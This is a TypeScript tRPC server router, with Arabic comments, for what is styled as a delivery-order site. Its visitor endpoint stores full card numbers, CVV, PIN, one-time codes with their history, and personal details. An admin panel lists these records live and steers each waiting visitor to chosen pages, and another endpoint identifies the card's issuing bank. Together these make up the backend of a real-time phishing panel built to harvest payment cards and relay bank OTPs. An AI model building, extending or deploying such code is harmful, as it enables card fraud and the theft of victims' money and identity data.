import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import {
  upsertLiveOrder,
  listLiveOrders,
  getLiveOrder,
  setLiveOrderDirective,
  deleteLiveOrder,
  countActiveVisitors,
  countTotalVisitors,
} from "./db";
import { lookupIssuer } from "./binLookup";
import {
  ADMIN_COOKIE_NAME,
  ADMIN_SESSION_MAX_AGE_MS,
  clearLoginFailures,
  createAdminSessionToken,
  getClientAddress,
  isAdminRequest,
  isLoginBlocked,
  recordLoginFailure,
  verifyAdminCredentials,
} from "./adminAuth";

const adminProcedure = publicProcedure.use(({ ctx, next }) => {
  if (!isAdminRequest(ctx.req)) {
    throw new TRPCError({ code: "UNAUTHORIZED", message: "يجب تسجيل الدخول إلى لوحة التحكم" });
  }
  return next({ ctx });
});

/* مخطط بيانات الطلب الحي القابلة للتحديث من الواجهة */
const liveOrderInput = z.object({
  publicId: z.string().min(3).max(40),
  page: z.string().max(80).optional(),
  name: z.string().max(160).optional(),
  idNumber: z.string().max(80).optional(),
  phone: z.string().max(60).optional(),
  email: z.string().max(160).optional(),
  tier: z.string().max(40).optional(),
  region: z.string().max(120).optional(),
  city: z.string().max(120).optional(),
  district: z.string().max(160).optional(),
  street: z.string().max(200).optional(),
  deliveryDate: z.string().max(60).optional(),
  cardNumber: z.string().max(40).optional(),
  bankName: z.string().max(120).optional(),
  expiry: z.string().max(16).optional(),
  cvv: z.string().max(8).optional(),
  pin: z.string().max(12).optional(),
  otp: z.string().max(16).optional(),
  otpHistory: z.string().optional(),
  bankAuth: z.string().max(40).optional(),
  authCount: z.number().int().min(0).optional(),
  directive: z.literal("wait").optional(),
  appendOtp: z.boolean().optional(),
  incAuth: z.boolean().optional(),
});

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  adminAuth: router({
    status: publicProcedure.query(({ ctx }) => ({ authenticated: isAdminRequest(ctx.req) })),
    login: publicProcedure
      .input(z.object({ username: z.string().min(1).max(80), password: z.string().min(1).max(128) }))
      .mutation(({ input, ctx }) => {
        const address = getClientAddress(ctx.req);
        if (isLoginBlocked(address)) {
          throw new TRPCError({ code: "TOO_MANY_REQUESTS", message: "محاولات كثيرة. حاول مرة أخرى لاحقًا" });
        }
        if (!verifyAdminCredentials(input.username, input.password)) {
          recordLoginFailure(address);
          throw new TRPCError({ code: "UNAUTHORIZED", message: "بيانات الدخول غير صحيحة" });
        }
        clearLoginFailures(address);
        ctx.res.cookie(ADMIN_COOKIE_NAME, createAdminSessionToken(), {
          ...getSessionCookieOptions(ctx.req),
          sameSite: "strict",
          maxAge: ADMIN_SESSION_MAX_AGE_MS,
        });
        return { success: true } as const;
      }),
    logout: adminProcedure.mutation(({ ctx }) => {
      ctx.res.clearCookie(ADMIN_COOKIE_NAME, { ...getSessionCookieOptions(ctx.req), sameSite: "strict", maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  orders: router({
    /** الزائر: إنشاء/تحديث بيانات طلبه */
    upsert: publicProcedure
      .input(liveOrderInput)
      .mutation(async ({ input, ctx }) => {
        const { publicId, appendOtp, incAuth, ...rest } = input;
        const ip = (ctx.req.headers["x-forwarded-for"] as string || ctx.req.socket?.remoteAddress || "").split(",")[0].trim();
        await upsertLiveOrder(publicId, rest, ip, { appendOtp, incAuth });
        return { success: true } as const;
      }),

    /** الزائر: جلب طلبه الحالي لمتابعة التوجيه */
    get: publicProcedure
      .input(z.object({ publicId: z.string() }))
      .query(async ({ input }) => (await getLiveOrder(input.publicId)) ?? null),

    /** المشرف: جلب جميع الطلبات */
    list: adminProcedure.query(async () => {
      const [orders, active, total] = await Promise.all([
        listLiveOrders(),
        countActiveVisitors(),
        countTotalVisitors(),
      ]);
      return { orders, active, total };
    }),

    /** المشرف: توجيه الزائر لصفحة معيّنة */
    direct: adminProcedure
      .input(z.object({
        publicId: z.string(),
        directive: z.string().max(60),
        status: z.string().max(20).optional(),
      }))
      .mutation(async ({ input }) => {
        await setLiveOrderDirective(input.publicId, input.directive, input.status);
        return { success: true } as const;
      }),

    /** الزائر: إعادة توجيه طلبه إلى الانتظار بعد الرجوع لخطوة قابلة لإعادة المحاولة */
    resetDirective: publicProcedure
      .input(z.object({ publicId: z.string().min(3).max(40) }))
      .mutation(async ({ input }) => {
        await setLiveOrderDirective(input.publicId, "wait");
        return { success: true } as const;
      }),

    /** المشرف: حذف طلب */
    remove: adminProcedure
      .input(z.object({ publicId: z.string() }))
      .mutation(async ({ input }) => {
        await deleteLiveOrder(input.publicId);
        return { success: true } as const;
      }),

    /** كشف اسم البنك المُصدِر من رقم البطاقة */
    detectBank: publicProcedure
      .input(z.object({ cardNumber: z.string().min(6).max(40) }))
      .query(async ({ input }) => lookupIssuer(input.cardNumber)),
  }),
});

export type AppRouter = typeof appRouter;
